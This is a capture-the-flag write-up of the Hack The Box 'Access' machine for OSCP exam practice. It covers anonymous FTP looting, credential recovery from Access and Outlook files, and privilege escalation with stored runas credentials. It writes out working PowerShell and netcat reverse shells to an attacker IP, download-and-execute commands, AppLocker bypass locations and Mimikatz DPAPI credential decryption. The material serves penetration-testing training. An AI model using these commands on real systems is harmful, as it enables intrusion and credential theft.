# Access — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.10.10.98                    |
| **OS**       | Windows (Server 2008 R2 / IIS 7.5) |
| **Difficulty** | Easy                         |
| **Key Skills** | Anonymous FTP, .mdb/.pst file forensics, AES-encrypted zip, Telnet access, certutil file transfer, AppLocker bypass, Stored credentials (cmdkey + runas /savecred), DPAPI credential extraction |

---

## 1. Enumeration

### Nmap — Key Ports
```
PORT      SERVICE         NOTES
21/tcp    FTP             Microsoft ftpd — Anonymous login allowed
23/tcp    Telnet          Microsoft Telnet Service
80/tcp    HTTP            Microsoft IIS httpd 7.5
```

### Key Observations
- **Only 3 ports** — minimal attack surface, typical of older Windows boxes
- **FTP anonymous access** — two directories: `Backups` and `Engineer`
- **Port 80** — single static image page, gobuster found nothing useful
- **IIS 7.5** — maps to Windows 7 / Server 2008 R2

### Web Enumeration (Port 80)
```bash
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt
# Nothing useful — move on to FTP
```

> **OSCP Technique — Minimal Attack Surface:**
> When gobuster returns nothing and a web page is static, don't waste time — pivot to other services. FTP and Telnet are the real attack surface here.

---

## 2. FTP Enumeration — File Recovery

### Anonymous FTP Login
```bash
ftp 10.10.10.98
# Login: anonymous / (any password)
# Response: "230 Anonymous access allowed"

ls
# Backups/
# Engineer/
```

### Download Files (Binary Mode Required!)
```bash
# CRITICAL: Switch to binary mode BEFORE downloading non-text files
binary

cd Backups
ls
# backup.mdb    (5,652,480 bytes)
get backup.mdb

cd ../Engineer
ls
# Access Control.zip    (10,870 bytes)

# Filename has a space — must quote it
get "Access Control.zip"
```

> **OSCP Technique — FTP Binary Mode:**
> Always run `binary` before downloading .mdb, .zip, .exe, or any non-text file over FTP. ASCII mode (the default) corrupts binary files by translating line endings.

> **OSCP Technique — FTP Passive Mode Issues:**
> If `wget -r ftp://10.10.10.98` fails with "Couldn't connect to passive mode", add `--no-passive-ftp`. Or in interactive FTP, type `passive` to toggle passive mode off.

### Alternative: wget for FTP Downloads
```bash
# Grab entire FTP recursively
wget -r ftp://anonymous:@10.10.10.98/

# If passive mode fails:
wget -r --no-passive-ftp ftp://anonymous:@10.10.10.98/

# Grab a specific file with spaces in the name
wget "ftp://anonymous:@10.10.10.98/Engineer/Access Control.zip"
```

---

## 3. File Forensics — Reading .mdb and .pst on Kali

### 3a. Reading backup.mdb (Microsoft Access Database)

```bash
# Identify the file
file backup.mdb
# Microsoft Access Database

# Install tools if needed
sudo apt install mdbtools

# List all tables
mdb-tables backup.mdb
# acc_anti498 acc_## ...  auth_user  USERINFO  ...

# Find tables with actual data (most are empty)
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do
  lines=$(mdb-export backup.mdb "$table" | wc -l)
  if [ "$lines" -gt 1 ]; then echo "$table: $lines"; fi
done

# Export the interesting table
mdb-export backup.mdb auth_user
```

**auth_user table output:**
```
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,...
27,"engineer","access4u@security",1,...
28,"backup_admin","admin",1,...
```

Credentials recovered:
| Username     | Password            | Notes |
|--------------|---------------------|-------|
| admin        | admin               | Weak default |
| engineer     | access4u@security   | **Key credential** — also the zip password |
| backup_admin | admin               | Weak default |

> **OSCP Technique — mdb-tools:**
> Use `mdb-tables` to list tables, `mdb-export <db> <table>` to dump as CSV. For interactive SQL: `mdb-sql -p <db>` then type queries ending with `go`. If `mdb-tables` gives "offset beyond EOF", try: `MDB_JET3_CHARSET=cp1252 mdb-tables backup.mdb`, or open in LibreOffice Base, or use `strings backup.mdb | grep -i pass` as a fallback.

### 3b. Cracking the Encrypted Zip

```bash
# Standard unzip fails:
unzip "Access Control.zip"
# error: unsupported compression method 99

# Method 99 = WinZip AES-256 encryption — use 7z instead
sudo apt install p7zip-full
7z x "Access Control.zip"
# Enter password: access4u@security    <-- from the mdb!
# Extracts: Access Control.pst
```

> **OSCP Technique — "Unsupported Compression Method 99":**
> This means AES-256 encryption, NOT a broken zip. Use `7z x` instead of `unzip`. Try every password you've found so far — credential reuse is extremely common.

### 3c. Reading Access Control.pst (Outlook Mailbox)

```bash
# Install readpst
sudo apt install pst-utils

# Convert .pst to .mbox
readpst "Access Control.pst"
# Output: Access Control.mbox   (1 folder, 1 email)

# Read the email
cat "Access Control.mbox"
```

**Email contents:**
```
From: John
Subject: MoS access  
Body: Hi there, The password for the "security" account has been changed
to 4Cc3ssC0ntr0ller. Please ensure this is passed on to any engineers
who need access.
```

New credential: **security / 4Cc3ssC0ntr0ller**

> **OSCP Technique — .pst Files:**
> Outlook .pst files are gold mines for credentials. Use `readpst` to convert to .mbox, then `cat` or `mutt -Rf` to read. Emails often contain passwords shared between staff.

---

## 4. Initial Access — Telnet

```bash
telnet 10.10.10.98
# Username: security
# Password: 4Cc3ssC0ntr0ller
# Welcome to Microsoft Telnet Service
# C:\Users\security>
```

### User Flag
```cmd
type C:\Users\security\Desktop\user.txt
```

> **OSCP Technique — Telnet Access:**
> Telnet (port 23) sends everything in plaintext, including credentials. When you see an open telnet port, try every credential pair you've collected. The shell you get is non-interactive (no tab completion, no arrow keys) — remember this for privesc.

---

## 5. Post-Exploitation — Enumeration

### Situational Awareness
```cmd
whoami
# access\security

whoami /priv
# No interesting privileges (no SeImpersonate)

systeminfo
# Windows Server 2008 R2 Standard
# x64

net user
# Administrator, Guest, security

net localgroup administrators
# Administrator
```

### Discover the Clue: Shortcut on Public Desktop
```cmd
dir C:\Users\Public\Desktop
# ZKAccess3.5 Security System.lnk

# Read the .lnk file — contains embedded strings
type "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"
# Shows: runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

The `.lnk` file reveals that this shortcut runs an application as **Administrator** using **/savecred** — meaning the Administrator password is cached.

### Parse .lnk Properly (Optional)
```cmd
powershell -c "$ws = New-Object -ComObject WScript.Shell; $sc = Get-ChildItem 'C:\Users\Public\Desktop\*.lnk'; $ws.CreateShortcut($sc)"
# TargetPath:    C:\Windows\System32\runas.exe
# Arguments:     /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

### Confirm Stored Credentials
```cmd
cmdkey /list
# Target: Domain:interactive=ACCESS\Administrator
# Type: Domain Password
# User: ACCESS\Administrator
```

> **OSCP Technique — cmdkey /list:**
> ALWAYS run `cmdkey /list` during Windows enumeration. If you see stored credentials for a higher-privilege user, you can abuse them with `runas /savecred` — no password needed.

---

## 6. Privilege Escalation — runas /savecred (Reverse Shell Callback)

### Why `runas` Alone Doesn't Work
On a non-interactive telnet shell, `runas` spawns a **new process** in a **new window**. You won't see output from:
```cmd
runas /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"
# This runs, but output goes to a new invisible window — you see nothing
```

### The Fix: Reverse Shell Callback

**Step 1 — Set up listener on Kali:**
```bash
nc -lnvp 443
```

**Step 2 — Generate the base64 PowerShell payload on Kali:**
```bash
echo -n 'IEX(New-Object Net.Sockets.TCPClient("10.10.14.11",443)).GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s=[text.encoding]::ASCII.GetBytes($r+"PS>");$stream.Write($s,0,$s.Length)}' | iconv -t UTF-16LE | base64 -w0
```

**Step 3 — Execute via runas on the target:**
```cmd
runas /savecred /user:ACCESS\Administrator "powershell -nop -ep bypass -e <BASE64_PAYLOAD>"
```

The reverse shell calls back as **access\administrator**.

### Alternative Method: Nishang One-Liner

**Step 1 — Prepare Nishang on Kali:**
```bash
# Copy and modify Invoke-PowerShellTcp
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1

# Append auto-execute line to the bottom of shell.ps1:
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443' >> shell.ps1

# Serve it
python3 -m http.server 80
```

**Step 2 — Listener:**
```bash
nc -lnvp 443
```

**Step 3 — Execute via runas on target:**
```cmd
runas /savecred /user:ACCESS\Administrator "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
```

### Root Flag
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

> **OSCP Technique — runas /savecred Non-Interactive Shell Trap:**
> `runas` spawns a new process. On a reverse shell or telnet session, you CANNOT see the output of the spawned process. You MUST use a reverse shell callback (PowerShell base64 or Nishang download-execute) so the new Administrator process connects back to your listener. This is the #1 mistake people make with cmdkey/runas.

### Alternative Quick Method: Copy Root Flag
If you just need the flag (not a full shell):
```cmd
# Copy root.txt to a readable location
runas /noprofile /savecred /user:Administrator "cmd.exe /C copy C:\Users\Administrator\Desktop\root.txt C:\Users\security\root.txt"
type C:\Users\security\root.txt
```

---

## 7. File Transfer on Old Windows (No wget/curl)

This box runs Server 2008 R2 — `wget`, `curl`, and `Invoke-WebRequest` are NOT available.

### certutil (Primary Method)
```cmd
certutil -urlcache -split -f http://10.10.14.11/nc.exe C:\Users\security\nc.exe
```

### PowerShell (System.Net.WebClient)
```cmd
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/winPEAS.bat','C:\Users\security\winPEAS.bat')"
```

### bitsadmin
```cmd
bitsadmin /transfer job /download /priority high http://10.10.14.11/nc.exe C:\Users\security\nc.exe
```

### SMB Share (No Firewall Issues)
```bash
# Kali: start a share
impacket-smbserver share . -smb2support

# Target: copy from share
copy \\10.10.14.11\share\nc.exe C:\Users\security\nc.exe
```

> **OSCP Technique — certutil:**
> On older Windows where `curl`/`wget` don't exist, `certutil -urlcache -split -f <URL> <output>` is your go-to file transfer method. It's built into every Windows version since Vista.

---

## 8. AppLocker Bypass (Bonus — Applies to This Box)

If executables are blocked by AppLocker / Software Restriction Policies:
```
This program is blocked by group policy.
```

### Whitelisted Directories
Copy your executable to one of these — they're typically whitelisted:
```cmd
C:\Windows\System32\spool\drivers\color\
C:\Windows\Temp\
C:\Windows\Tasks\
C:\Windows\tracing\
```

```cmd
certutil -urlcache -split -f http://10.10.14.11/nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.11 443
```

### Alternatives When .exe Is Blocked
- Use `.bat` versions of tools (e.g., `winPEAS.bat` instead of `winPEASx64.exe`)
- Use `powershell` directly — scripts often bypass AppLocker in default configs
- Use LOLBAS binaries (mshta, wscript, cscript, msiexec, rundll32)

> **OSCP Technique — AppLocker Bypass:**
> When you see "blocked by group policy", don't give up. Copy executables to whitelisted directories (spool\drivers\color is the classic), use .bat alternatives, or leverage LOLBAS living-off-the-land binaries.

---

## 9. Alternative Privesc — DPAPI Credential Extraction

This is a more advanced path that extracts the actual Administrator password.

### Collect DPAPI Files
```cmd
# Find the master key (GUID)
dir /s C:\Users\security\AppData\Roaming\Microsoft\Protect\

# Find credential blobs
dir /s C:\Users\security\AppData\Roaming\Microsoft\Credentials\

# Exfiltrate via base64 (since we can't download directly)
certutil -encode "C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\<MASTERKEY-GUID>" C:\Users\security\mk.b64
type C:\Users\security\mk.b64

certutil -encode "C:\Users\security\AppData\Roaming\Microsoft\Credentials\<CRED-BLOB>" C:\Users\security\cred.b64
type C:\Users\security\cred.b64
```

### Decode on Kali and Decrypt with Mimikatz
```bash
# Copy the base64 output, decode:
echo "<base64>" | base64 -d > masterkey
echo "<base64>" | base64 -d > credential
```

On a Windows box with Mimikatz:
```
# Decrypt master key using the user's password
dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller

# Decrypt credential blob
dpapi::cred /in:credential
# CredentialBlob: 55Acc3ssS3cur1ty@megacorp
# UserName: ACCESS\Administrator
```

Now you can telnet directly as Administrator:
```bash
telnet 10.10.10.98
# Username: administrator
# Password: 55Acc3ssS3cur1ty@megacorp
```

> **OSCP Technique — DPAPI:**
> When you have stored credentials (cmdkey), the actual password is encrypted with DPAPI. If you know the user's password, you can decrypt the master key, then decrypt the credential blob to get the stored password in plaintext. Useful when you need the actual password (e.g., for RDP or other services).

---

## 10. Attack Chain Summary

```
Anonymous FTP (21)
    |
    +--> backup.mdb
    |        |
    |        +--> mdb-export auth_user
    |                 |
    |                 +--> engineer : access4u@security
    |
    +--> "Access Control.zip" (AES-encrypted)
             |
             +--> 7z x (password: access4u@security)
                      |
                      +--> Access Control.pst
                               |
                               +--> readpst --> email
                                        |
                                        +--> security : 4Cc3ssC0ntr0ller
                                                 |
                                                 +--> Telnet (23) as security
                                                          |
                                                          +--> USER FLAG
                                                          |
                                                          +--> cmdkey /list
                                                          |        |
                                                          |        +--> Administrator creds stored
                                                          |
                                                          +--> runas /savecred + reverse shell callback
                                                                   |
                                                                   +--> ROOT FLAG
```

---

## 11. OSCP Exam Takeaways

### Techniques Demonstrated
1. **Anonymous FTP enumeration** — always check, always download everything in binary mode
2. **File forensics on Kali** — mdb-tools for Access databases, readpst for Outlook .pst, 7z for AES zips
3. **Credential chaining** — password from DB unlocks zip, email in zip reveals new creds, new creds give shell, stored creds give admin
4. **Telnet as an access vector** — plain-text protocol, test every credential pair
5. **certutil file transfer** — essential for older Windows where wget/curl don't exist
6. **AppLocker bypass** — whitelisted directories when executables are blocked
7. **cmdkey + runas /savecred** — stored credentials abuse
8. **Non-interactive shell awareness** — runas needs a callback, not direct execution
9. **DPAPI extraction** — advanced alternative to get the actual stored password

### Exam Patterns
- **3-stage credential chain:** File forensic artifact --> credential --> next artifact --> credential --> access
- **Old Windows boxes** are common on OSCP — know your file transfer alternatives
- **Always check cmdkey /list** — one of the easiest privesc methods when present
- **Non-interactive shell pitfalls** — the exam is full of reverse shells where runas/nc/etc. won't show output in your current terminal
- **Read .lnk files** — shortcuts on Public Desktop or Startup folders often reveal how services run and what privileges they use

